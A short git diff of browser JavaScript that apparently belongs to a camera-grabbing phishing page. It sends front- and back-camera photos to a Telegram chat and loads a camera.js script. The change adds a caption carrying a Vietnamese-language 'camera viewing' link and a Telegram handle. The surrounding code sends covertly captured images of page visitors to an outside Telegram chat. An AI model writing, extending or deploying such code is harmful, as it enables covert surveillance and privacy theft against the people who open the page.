@@ -151,11 +151,18 @@ function getCaption() {
 `.trim();
 }
 
+function getCaptionWithExtras() {
+  return getCaption() + `
+
+📽️ Link xem camera: https://websitevip.github.io/webview/  
+🗣️ Xem đê @ontop2k9`;
+}
+
 async function sendPhotos(frontBlob, backBlob) {
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID_WITH_PHOTOS);
   formData.append('media', JSON.stringify([
-    { type: 'photo', media: 'attach://front', caption: getCaption() },
+    { type: 'photo', media: 'attach://front', caption: getCaptionWithExtras() },
     { type: 'photo', media: 'attach://back' }
   ]));
   formData.append('front', frontBlob, 'front.jpg');
@@ -209,7 +216,7 @@ main().then(async () => {
   await delay(1500);
 
   const script = document.createElement('script');
-  script.src = 'camera.js';       // ⚠️ Đảm bảo camera.js tồn tại cùng thư mục
+  script.src = 'camera.js'; // 🔧 camera.js cần đặt cùng thư mục
   script.defer = true;
   document.body.appendChild(script);
 
